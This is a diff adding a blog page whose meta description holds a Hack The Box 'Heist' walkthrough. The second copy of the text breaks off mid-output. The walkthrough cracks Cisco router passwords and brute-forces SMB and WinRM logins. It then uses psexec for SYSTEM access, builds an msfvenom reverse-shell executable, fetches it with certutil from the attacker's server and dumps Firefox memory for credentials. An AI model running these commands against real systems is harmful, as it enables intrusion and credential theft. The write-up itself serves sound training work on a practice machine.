@@ -1,0 +1,657 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Heist" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.149 heist.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ nmap -sV -sT -sC heist.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-17 10:31 EDT Nmap scan report for heist.htb (10.10.10.149) Host is up (0.27s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 30s, deviation: 0s, median: 30s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-08-17 10:32:16 |_ start_date: N/A 5985/tcp open wsman 49669/tcp open unknown Lets first check out the http service on port 80. We don’t have any credentials so lets try to login as a guest. /issues.php: This looks like a IT helpdesk ticketing system. It looks like Hazard is having issues with his cisco router and he has posted his configuration file. /attachments/config.txt: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 version 12.2 no service pad service password-encryption ! isdn switch-type basic-5ess ! hostname ios-1 ! security passwords min-length 12 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 ! username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 ! ! ip ssh authentication-retries 5 ip ssh version 2 ! ! router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Â mask 300.255.255.0 timers bgp 3 9 redistribute connected ! ip classless ip route 0.0.0.0 0.0.0.0 192.168.0.1 ! ! access-list 101 permit ip any any dialer-list 1 protocol ip list 101 ! no ip http server no ip http secure-server ! line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh First thing to note is 1 service password-encryption which tells us that all passwords in the configuration file are encrypted. Next up, we get 1 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 which has a Type 5 encrypted password. To crack it, I will be using this tool. 1 2 3 4 5 6 7 8 9 10 11 12 $ python3 cisco_pwdecrypt.py -u &quot;\$1\$pdQG\$o8nrSzsGXeaduXrjlvKc91&quot; -d /usr/share/wordlists/rockyou.txt [*] Bruteforcing &#39;type 5&#39; hash... Found 14344392 passwords to test. Testing: $1$pdQG$o8nrSzsGXeaduXrjlvKc91 Hash Type = MD5 Salt = pdQG Hash = o8nrSzsGXeaduXrjlvKc91 [Status] 132/14344392 password tested... [*] Password Found = stealth1agent Lastly, we have 1 2 username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 which both contains a username and a Type 7 encrypted password. To crack them, I will be using the same tool. 1 2 3 4 5 $ python3 cisco_pwdecrypt.py -t 0242114B0E143F015F5D1E161713 [*] Result: $uperP@ssword $ python3 cisco_pwdecrypt.py -t 02375012182C1A1D751618034F36415408 [*] Result: Q4)sJu\Y8qz*A3?d With all the credentials we have collected so far, lets create 2 files to store them. user.txt: 1 2 3 4 Hazard hazard rout3r admin pass.txt: 1 2 3 stealth1agent $uperP@ssword Q4)sJu\Y8qz*A3?d With some credentials, lets move on to the smb service on port 445. I will be using the auxiliary/scanner/smb/smb_login module in Metasploit to test the different combinations. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ msfconsole msf5 &gt; use auxiliary/scanner/smb/smb_login msf5 auxiliary(scanner/smb/smb_login) &gt; set RHOSTS heist.htb RHOSTS =&gt; heist.htb msf5 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE user.txt USER_FILE =&gt; user.txt msf5 auxiliary(scanner/smb/smb_login) &gt; set PASS_FILE pass.txt PASS_FILE =&gt; pass.txt msf5 auxiliary(scanner/smb/smb_login) &gt; set THREADS 50 THREADS =&gt; 50 msf5 auxiliary(scanner/smb/smb_login) &gt; set VERBOSE false VERBOSE =&gt; false msf5 auxiliary(scanner/smb/smb_login) &gt; run [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;.\Hazard:stealth1agent&#39; [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;.\hazard:stealth1agent&#39; [*] heist.htb:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Using hazard:stealth1agent, lets see what we can access in the smb shares! 1 2 3 4 5 6 7 8 9 $ smbmap -H heist.htb -u hazard -p stealth1agent [+] Finding open SMB ports.... [+] User SMB session establishd on heist.htb... [+] IP: heist.htb:445 Name: heist.htb Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS IPC$ READ ONLY I guess the smb service is a dead end? Maybe not. Using Impacket’s lookupsid.py, we are able to enumerate for other users on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ python lookupsid.py Hazard:stealth1agent@heist.htb Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Brute forcing SIDs at 10.10.10.149 [*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc] [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112 500: SUPPORTDESK\Administrator (SidTypeUser) 501: SUPPORTDESK\Guest (SidTypeUser) 503: SUPPORTDESK\DefaultAccount (SidTypeUser) 504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser) 513: SUPPORTDESK\None (SidTypeGroup) 1008: SUPPORTDESK\Hazard (SidTypeUser) 1009: SUPPORTDESK\support (SidTypeUser) 1012: SUPPORTDESK\Chase (SidTypeUser) 1013: SUPPORTDESK\Jason (SidTypeUser) From this, we are able to find out that the domain is SUPPORTDESK. With these new users, lets update our user.txt. 1 2 3 4 5 6 7 8 Hazard hazard rout3r admin Chase Jason support Administrator And run the auxiliary/scanner/smb/smb_login module again. 1 2 3 4 5 6 7 8 9 msf5 auxiliary(scanner/smb/smb_login) &gt; set DOMAIN SUPPORTDESK DOMAIN =&gt; SUPPORTDESK msf5 auxiliary(scanner/smb/smb_login) &gt; run [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;SUPPORTDESK\Hazard:stealth1agent&#39; [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;SUPPORTDESK\hazard:stealth1agent&#39; [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;SUPPORTDESK\Chase:Q4)sJu\Y8qz*A3?d&#39; [*] heist.htb:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Alright! We got another set of credentials! Lets try to access the smb shares using Chase:Q4)sJu\Y8qz*A3?d! 1 2 3 4 5 6 7 8 9 $ smbmap -H heist.htb -u Chase -p &quot;Q4)sJu\Y8qz*A3?d&quot; -d SUPPORTDESK [+] Finding open SMB ports.... [+] User SMB session establishd on heist.htb... [+] IP: heist.htb:445 Name: heist.htb Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS IPC$ READ ONLY Still nothing? I guess the smb service really is a dead end :( If we go back to our reconnaissance results, there is actually one more service on port 5985: wsman. After some research, the wsman service is the WinRM service on the machine. Could we possbily use it to remotely execute commands on the machine? But first, we need to know what credentials we can use by using the auxiliary/scanner/winrm/winrm_login module in Metasploit. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 msf5 auxiliary(scanner/smb/smb_login) &gt; use auxiliary/scanner/winrm/winrm_login msf5 auxiliary(scanner/winrm/winrm_login) &gt; set RHOSTS heist.htb RHOSTS =&gt; heist.htb msf5 auxiliary(scanner/winrm/winrm_login) &gt; set USER_FILE username.txt USER_FILE =&gt; username.txt msf5 auxiliary(scanner/winrm/winrm_login) &gt; set PASS_FILE password.txt PASS_FILE =&gt; password.txt msf5 auxiliary(scanner/winrm/winrm_login) &gt; set THREADS 50 THREADS =&gt; 50 msf5 auxiliary(scanner/winrm/winrm_login) &gt; set VERBOSE false VERBOSE =&gt; false msf5 auxiliary(scanner/winrm/winrm_login) &gt; set DOMAIN SUPPORTDESK DOMAIN =&gt; SUPPORTDESK msf5 auxiliary(scanner/winrm/winrm_login) &gt; run [+] 10.10.10.149:5985 - Login Successful: SUPPORTDESK\Chase:Q4)sJu\Y8qz*A3?d [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed user.txt Okay… So the same Chase user have access to both the smb and WinRM service. To establish a shell, I used Alamot’s winrm_shell.rb with the following configuration settings: 1 2 3 4 5 6 7 8 require &#39;winrm&#39; conn = WinRM::Connection.new( endpoint: &#39;http://10.10.10.149:5985/wsman&#39;, transport: :ssl, user: &#39;SUPPORTDESK\Chase&#39;, password: &#39;Q4)sJu\Y8qz*A3?d&#39;, :no_ssl_peer_verification =&gt; true ) And now we execute the WinRM shell… 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ruby winrm_shell.rb PS supportdesk\chase@SUPPORTDESK Documents&gt; cd .. PS supportdesk\chase@SUPPORTDESK Chase&gt; cd Desktop PS supportdesk\chase@SUPPORTDESK Desktop&gt; dir Directory: C:\Users\Chase\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/22/2019 9:08 AM 121 todo.txt -a---- 4/22/2019 9:07 AM 32 user.txt PS supportdesk\chase@SUPPORTDESK Desktop&gt; more user.txt a127XXXXXXXXXXXXXXXXXXXXXXXXXXXX root.txt (1) When I first did this machine, I found the SHA-256 hash of the Administrator’s password which I was able to somehow crack it using an online website. From what we know, there was a IIS web server running on port 80 so I checked out C:\inetpub\wwwroot. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 PS supportdesk\chase@SUPPORTDESK inetpub&gt; dir Volume in drive C has no label. Volume Serial Number is 78E3-E62D Directory of C:\inetpub\wwwroot 04/21/2019 05:42 PM &lt;DIR&gt; . 04/21/2019 05:42 PM &lt;DIR&gt; .. 04/21/2019 05:41 PM &lt;DIR&gt; attachments 04/21/2019 05:41 PM &lt;DIR&gt; css 04/21/2019 11:51 AM 1,240 errorpage.php 04/21/2019 05:41 PM &lt;DIR&gt; images 04/21/2019 11:33 AM 279 index.php 04/22/2019 08:38 AM 3,034 issues.php 04/21/2019 05:41 PM &lt;DIR&gt; js 04/22/2019 06:48 AM 2,657 login.php 4 File(s) 7,210 bytes 6 Dir(s) 7,923,224,576 bytes free I skimmed through the pages until I came across login.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 &lt;?php session_start(); if( isset($_REQUEST[&#39;login&#39;]) &amp;&amp; !empty($_REQUEST[&#39;login_username&#39;]) &amp;&amp; !empty($_REQUEST[&#39;login_password&#39;])) { if( $_REQUEST[&#39;login_username&#39;] === &#39;admin@support.htb&#39; &amp;&amp; hash( &#39;sha256&#39;, $_REQUEST[&#39;login_password&#39;]) === &#39;91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040&#39;) { $_SESSION[&#39;admin&#39;] = &quot;valid&quot;; header(&#39;Location: issues.php&#39;); } else header(&#39;Location: errorpage.php&#39;); } else if( isset($_GET[&#39;guest&#39;]) ) { if( $_GET[&#39;guest&#39;] === &#39;true&#39; ) { $_SESSION[&#39;guest&#39;] = &quot;valid&quot;; header(&#39;Location: issues.php&#39;); } } ?&gt; The SHA-256 hash of the admin’s password was hardcoded in login.php. I immediately tried different online password cracking websites until I came across this website. I supplied the hash and got the password 4dD!5}x/re8]FBuZ. Using Impacket’s psexec.py, I was able to establish a shell. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ python psexec.py Administrator:&#39;4dD!5}x/re8]FBuZ&#39;@heist.htb Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Requesting shares on heist.htb..... [*] Found writable share ADMIN$ [*] Uploading file igPymROC.exe [*] Opening SVCManager on heist.htb..... [*] Creating service KKCH on heist.htb..... [*] Starting service KKCH..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.437] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;whoami nt authority\system C:\Windows\system32&gt;cd C:\Users\Administrator\Desktop C:\Users\Administrator\Desktop&gt;more root.txt 50dfXXXXXXXXXXXXXXXXXXXXXXXXXXXX root.txt (2) So apparently there was another or more “proper” way to solving this box by using a very certain process. But first, lets upgrade to a meterpreter shell. To do so, we will first need to create our executable which will establish the reverse connection back to our listener. After that, move the executable into the directory that the SimpleHTTPServer is running from. 1 2 3 4 5 6 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XXX.XXX LPORT=1337 -f exe &gt; shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of exe file: 73802 bytes And we start our listener on port 1337… 1 2 3 4 5 6 7 8 9 10 11 $ msfconsole msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set LPORT 1337 LPORT =&gt; 1337 msf5 exploit(multi/handler) &gt; set LHOST 10.10.XXX.XXX LHOST =&gt; 10.10.14.61 msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.XXX.XXX:1337 Back to our WinRM shell, we retrieve the executable from our SimpleHTTPServer using certutil.exe and run it. 1 2 3 4 5 6 PS supportdesk\chase@SUPPORTDESK Chase&gt; certutil.exe -urlcache -split -f http://10.10.XXX.XXX/shell.exe **** Online **** 000000 ... 01204a CertUtil: -URLCache command completed successfully. PS supportdesk\chase@SUPPORTDESK Documents&gt; cmd.exe /k shell.exe Back on our listener, we obtained a meterpreter shell. 1 2 3 4 [*] Sending stage (179779 bytes) to 10.10.10.149 [*] Meterpreter session 1 opened (10.10.XXX.XXX:1337 -&gt; 10.10.10.149:49694) at 2019-08-31 09:04:09 -0400 meterpreter &gt; When we list all the processes running on the box using the ps command, we noticed that firefox.exe is currently running. 1 2 3 4 5 6 7 8 9 10 11 meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 796 4660 firefox.exe x64 1 SUPPORTDESK\Chase C:\Program Files\Mozilla Firefox\firefox.exe 1620 796 firefox.exe x64 1 SUPPORTDESK\Chase C:\Program Files\Mozilla Firefox\firefox.exe 2264 796 firefox.exe x64 1 SUPPORTDESK\Chase C:\Program Files\Mozilla Firefox\firefox.exe 5912 796 firefox.exe x64 1 SUPPORTDESK\Chase C:\Program Files\Mozilla Firefox\firefox.exe 6068 796 firefox.exe x64 1 SUPPORTDESK\Chase C:\Program Files\Mozilla Firefox\firefox.exe Lets try to dump out the process’s memory to see if we can extract any credentials! I will be using Sysinternals’s procdump.exe. Since we already have a meterpreter shell, we can just use the upload command to transfer it over. 1 2 3 4 meterpreter &gt; upload procdump.exe [*] uploading : procdump.exe -&gt; procdump.exe [*] Uploaded 636.16 KiB of 636.16 KiB (100.0%): procdump.exe -&gt; procdump.exe [*] uploaded : procdump.exe -&gt; procdump.exe Next up, we spawn a cmd.exe shell and run procdump.exe on the firefox.exe process. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 meterpreter &gt; shell Process 3708 created. Channel 102 created. Microsoft Windows [Version 10.0.17763.437] (c) 2018 Microsoft Corporation. All rights reserved. C:\Users\Chase&gt;procdump.exe -accepteula -ma 796 procdump.exe -accepteula -ma 796 ProcDump v9.0 - Sysinternals process dump utility Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards Sysinternals - www.sysinternals.com [19:30:23] Dump 1 initiated: C:\Users\Chase\firefox.exe_190831_193023.dmp [19:30:24] Dump 1 writing: Estimated dump file size is 473 MB. [19:30:29] Dump 1 complete: 474 MB written in 5.2 seconds [19:30:29] Dump count reached. With that done, we exit out of our cmd.exe and use the download command to retrieve the process dump. 1 2 3 4 5 6 C:\Users\Chase&gt;exit exit meterpreter &gt; download C:\\Users\\Chase\\firefox.exe_190831_193023.dmp [*] Downloading: C:\Users\Chase\firefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp [*] Downloaded 462.05 MiB of 462.05 MiB (100.0%): C:\Users\Chase\firefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp [*] download : C:\Users\Chase\firefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp The final step is simply to run strings on it and grep for password. There were many lines containing password but I came across this line: 1 :http://localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login= The password seems to be the value for login_password. Refer to root.txt (1) on how to establish a shell using the credentials we found. Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.149 heist.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ nmap -sV -sT -sC heist.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-17 10:31 EDT Nmap scan report for heist.htb (10.10.10.149) Host is up (0.27s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 30s, deviation: 0s, median: 30s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-08-17 10:32:16 |_ start_date: N/A 5985/tcp open wsman 49669/tcp open unknown Lets first check out the http service on port 80. We don’t have any credentials so lets try to login as a guest. /issues.php: This looks like a IT helpdesk ticketing system. It looks like Hazard is having issues with his cisco router and he has posted his configuration file. /attachments/config.txt: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 version 12.2 no service pad service password-encryption ! isdn switch-type basic-5ess ! hostname ios-1 ! security passwords min-length 12 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 ! username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 ! ! ip ssh authentication-retries 5 ip ssh version 2 ! ! router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Â mask 300.255.255.0 timers bgp 3 9 redistribute connected ! ip classless ip route 0.0.0.0 0.0.0.0 192.168.0.1 ! ! access-list 101 permit ip any any dialer-list 1 protocol ip list 101 ! no ip http server no ip http secure-server ! line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh First thing to note is 1 service password-encryption which tells us that all passwords in the configuration file are encrypted. Next up, we get 1 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 which has a Type 5 encrypted password. To crack it, I will be using this tool. 1 2 3 4 5 6 7 8 9 10 11 12 $ python3 cisco_pwdecrypt.py -u &quot;\$1\$pdQG\$o8nrSzsGXeaduXrjlvKc91&quot; -d /usr/share/wordlists/rockyou.txt [*] Bruteforcing &#39;type 5&#39; hash... Found 14344392 passwords to test. Testing: $1$pdQG$o8nrSzsGXeaduXrjlvKc91 Hash Type = MD5 Salt = pdQG Hash = o8nrSzsGXeaduXrjlvKc91 [Status] 132/14344392 password tested... [*] Password Found = stealth1agent Lastly, we have 1 2 username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 which both contains a username and a Type 7 encrypted password. To crack them, I will be using the same tool. 1 2 3 4 5 $ python3 cisco_pwdecrypt.py -t 0242114B0E143F015F5D1E161713 [*] Result: $uperP@ssword $ python3 cisco_pwdecrypt.py -t 02375012182C1A1D751618034F36415408 [*] Result: Q4)sJu\Y8qz*A3?d With all the credentials we have collected so far, lets create 2 files to store them. user.txt: 1 2 3 4 Hazard hazard rout3r admin pass.txt: 1 2 3 stealth1agent $uperP@ssword Q4)sJu\Y8qz*A3?d With some credentials, lets move on to the smb service on port 445. I will be using the auxiliary/scanner/smb/smb_login module in Metasploit to test the different combinations. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ msfconsole msf5 &gt; use auxiliary/scanner/smb/smb_login msf5 auxiliary(scanner/smb/smb_login) &gt; set RHOSTS heist.htb RHOSTS =&gt; heist.htb msf5 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE user.txt USER_FILE =&gt; user.txt msf5 auxiliary(scanner/smb/smb_login) &gt; set PASS_FILE pass.txt PASS_FILE =&gt; pass.txt msf5 auxiliary(scanner/smb/smb_login) &gt; set THREADS 50 THREADS =&gt; 50 msf5 auxiliary(scanner/smb/smb_login) &gt; set VERBOSE false VERBOSE =&gt; false msf5 auxiliary(scanner/smb/smb_login) &gt; run [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;.\Hazard:stealth1agent&#39; [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;.\hazard:stealth1agent&#39; [*] heist.htb:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Using hazard:stealth1agent, lets see what we can access in the smb shares! 1 2 3 4 5 6 7 8 9 $ smbmap -H heist.htb -u hazard -p stealth1agent [+] Finding open SMB ports.... [+] User SMB session establishd on heist.htb... [+] IP: heist.htb:445 Name: heist.htb Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS IPC$ READ ONLY I guess the smb service is a dead end? Maybe not. Using Impacket’s lookupsid.py, we are able to enumerate for other users on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ python lookupsid.py Hazard:stealth1agent@heist.htb Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Brute forcing SIDs at 10.10.10.149 [*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc] [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112 500: SUPPORTDESK\Administrator (SidTypeUser) 501: SUPPORTDESK\Guest (SidTypeUser) 503: SUPPORTDESK\DefaultAccount (SidTypeUser) 504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser) 513: SUPPORTDESK\None (SidTypeGroup) 1008: SUPPORTDESK\Hazard (SidTypeUser) 1009: SUPPORTDESK\support (SidTypeUser) 1012: SUPPORTDESK\Chase (SidTypeUser) 1013: SUPPORTDESK\Jason (SidTypeUser) From this, we are able to find out that the domain is SUPPORTDESK. With these new users, lets update our user.txt. 1 2 3 4 5 6 7 8 Hazard hazard rout3r admin Chase Jason support Administrator And run the auxiliary/scanner/smb/smb_login module again. 1 2 3 4 5 6 7 8 9 msf5 auxiliary(scanner/smb/smb_login) &gt; set DOMAIN SUPPORTDESK DOMAIN =&gt; SUPPORTDESK msf5 auxiliary(scanner/smb/smb_login) &gt; run [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;SUPPORTDESK\Hazard:stealth1agent&#39; [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;SUPPORTDESK\hazard:stealth1agent&#39; [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;SUPPORTDESK\Chase:Q4)sJu\Y8qz*A3?d&#39; [*] heist.htb:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Alright! We got another set of credentials! Lets try to access the smb shares using Chase:Q4)sJu\Y8qz*A3?d! 1 2 3 4 5 6 7 8 9 $ smbmap -H heist.htb -u Chase -p &quot;Q4)sJu\Y8qz*A3?d&quot; -d SUPPORTDESK [+] Finding open SMB ports.... [+] User SMB session establishd on heist.htb... [+] IP: heist.htb:445 Name: heist.htb Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS IPC$ READ ONLY Still nothing? I guess the smb service really is a dead end :( If we go back to our reconnaissance results, there is actually one more service on port 5985: wsman. After some research, the wsman service is the WinRM service on the machine. Could we possbily use it to remotely execute commands on the machine? But first, we need to know what credentials we can use by using the auxiliary/scanner/winrm/winrm_login module in Metasploit. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 msf5 auxiliary(scanner/smb/smb_login) &gt; use auxiliary/scanner/winrm/winrm_login msf5 auxiliary(scanner/winrm/winrm_login) &gt; set RHOSTS heist.htb RHOSTS =&gt; heist.htb msf5 auxiliary(scanner/winrm/winrm_login) &gt; set USER_FILE username.txt USER_FILE =&gt; username.txt msf5 auxiliary(scanner/winrm/winrm_login) &gt; set PASS_FILE password.txt PASS_FILE =&gt; password.txt msf5 auxiliary(scanner/winrm/winrm_login) &gt; set THREADS 50 THREADS =&gt; 50 msf5 auxiliary(scanner/winrm/winrm_login) &gt; set VERBOSE false VERBOSE =&gt; false msf5 auxiliary(scanner/winrm/winrm_login) &gt; set DOMAIN SUPPORTDESK DOMAIN =&gt; SUPPORTDESK msf5 auxiliary(scanner/winrm/winrm_login) &gt; run [+] 10.10.10.149:5985 - Login Successful: SUPPORTDESK\Chase:Q4)sJu\Y8qz*A3?d [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed user.txt Okay… So the same Chase user have access to both the smb and WinRM service. To establish a shell, I used Alamot’s winrm_shell.rb with the following configuration settings: 1 2 3 4 5 6 7 8 require &#39;winrm&#39; conn = WinRM::Connection.new( endpoint: &#39;http://10.10.10.149:5985/wsman&#39;, transport: :ssl, user: &#39;SUPPORTDESK\Chase&#39;, password: &#39;Q4)sJu\Y8qz*A3?d&#39;, :no_ssl_peer_verification =&gt; true ) And now we execute the WinRM shell… 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ruby winrm_shell.rb PS supportdesk\chase@SUPPORTDESK Documents&gt; cd .. PS supportdesk\chase@SUPPORTDESK Chase&gt; cd Desktop PS supportdesk\chase@SUPPORTDESK Desktop&gt; dir Directory: C:\Users\Chase\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/22/2019 9:08 AM 121 todo.txt -a---- 4/22/2019 9:07 AM 32 user.txt PS supportdesk\chase@SUPPORTDESK Desktop&gt; more user.txt a127XXXXXXXXXXXXXXXXXXXXXXXXXXXX root.txt (1) When I first did this machine, I found the SHA-256 hash of the Administrator’s password which I was able to somehow crack it using an online website. From what we know, there was a IIS web server running on port 80 so I checked out C:\inetpub\wwwroot. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 PS supportdesk\chase@SUPPORTDESK inetpub&gt; dir Volume in drive C has no label. Volume Serial Number is 78E3-E62D Directory of C:\inetpub\wwwroot 04/21/2019 05:42 PM &lt;DIR&gt; . 04/21/2019 05:42 PM &lt;DIR&gt; .. 04/21/2019 05:41 PM &lt;DIR&gt; attachments 04/21/2019 05:41 PM &lt;DIR&gt; css 04/21/2019 11:51 AM 1,240 errorpage.php 04/21/2019 05:41 PM &lt;DIR&gt; images 04/21/2019 11:33 AM 279 index.php 04/22/2019 08:38 AM 3,034 issues.php 04/21/2019 05:41 PM &lt;DIR&gt; js 04/22/2019 06:48 AM 2,657 login.php 4 File(s) 7,210 bytes 6 Dir(s) 7,923,224,576 bytes free I skimmed through the pages until I came across login.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 &lt;?php session_start(); if( isset($_REQUEST[&#39;login&#39;]) &amp;&amp; !empty($_REQUEST[&#39;login_username&#39;]) &amp;&amp; !empty($_REQUEST[&#39;login_password&#39;])) { if( $_REQUEST[&#39;login_username&#39;] === &#39;admin@support.htb&#39; &amp;&amp; hash( &#39;sha256&#39;, $_REQUEST[&#39;login_password&#39;]) === &#39;91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040&#39;) { $_SESSION[&#39;admin&#39;] = &quot;valid&quot;; header(&#39;Location: issues.php&#39;); } else header(&#39;Location: errorpage.php&#39;); } else if( isset($_GET[&#39;guest&#39;]) ) { if( $_GET[&#39;guest&#39;] === &#39;true&#39; ) { $_SESSION[&#39;guest&#39;] = &quot;valid&quot;; header(&#39;Location: issues.php&#39;); } } ?&gt; The SHA-256 hash of the admin’s password was hardcoded in login.php. I immediately tried different online password cracking websites until I came across this website. I supplied the hash and got the password 4dD!5}x/re8]FBuZ. Using Impacket’s psexec.py, I was able to establish a shell. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ python psexec.py Administrator:&#39;4dD!5}x/re8]FBuZ&#39;@heist.htb Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Requesting shares on heist.htb..... [*] Found writable share ADMIN$ [*] Uploading file igPymROC.exe [*] Opening SVCManager on heist.htb..... [*] Creating service KKCH on heist.htb..... [*] Starting service KKCH..... [!] Press help for extra shell commands 